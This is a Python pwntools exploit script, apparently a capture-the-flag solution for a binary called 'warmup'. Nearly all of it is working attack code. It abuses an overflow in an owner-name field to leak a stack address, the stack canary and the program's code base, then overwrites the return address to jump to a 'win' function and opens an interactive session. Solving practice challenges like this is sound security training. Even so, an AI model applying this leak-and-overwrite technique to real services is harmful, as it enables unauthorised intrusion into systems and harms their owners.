#!/usr/bin/env python3

from pwn import *

exe = ELF('./warmup_patched')
libc = ELF('./libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

def create(name, msg):
    sla(b"choice :", b"1")
    sla(b"owner :", name)
    sla(b"message :", msg)

def upd_own(id, name):
    sla(b"choice :", b"2")
    sla(b"ID :", f"{id}".encode())
    sla(b"options:", b"1")
    sla(b"owner :", name)

def upd_msg(id, msg):
    sla(b"choice :", b"2")
    sla(b"ID :", f"{id}".encode())
    sla(b"options:", b"2")
    sla(b"message :", msg)

def view():
    sla(b"choice :", b"3")

script = '''
# memcpy
brva 0x16DE
# fgets name
brva 0x16B2
'''

p = remote("0", 9001)
#p = process('./warmup_patched')
#p = gdb.debug('./warmup', gdbscript = script)

create(b"A" * 0x11, b"A" * 0xC5)

# leak stack
upd_own(0, b"B" * 0x13)
view()
rcu(b"B" * 0x13 + b"\n")
rbp = u64(p.recv(6).ljust(8, b"\x00")) + 0x140
lleak("rbp", rbp)

# leak canary
upd_own(0, b"B" * 0x14 + p64(rbp - 0x8 + 1))
view()
rcu(b"run at : ")
canary = u64(b"\x00" + p.recv(7))
lleak("canary", canary)

# leak code base
upd_own(0, b"B" * 0x14 + p64(rbp + 0x28))
view()
rcu(b"run at : ")
code_base = u64(p.recv(6).ljust(8, b"\x00")) - exe.symbols['main']
lleak("code base", code_base)

# ret2win
payload = b"B" * 0x28 + p64(canary) + p64(0) + p64(code_base + exe.symbols['win'] + 5)
upd_own(0, payload)

p.interactive()
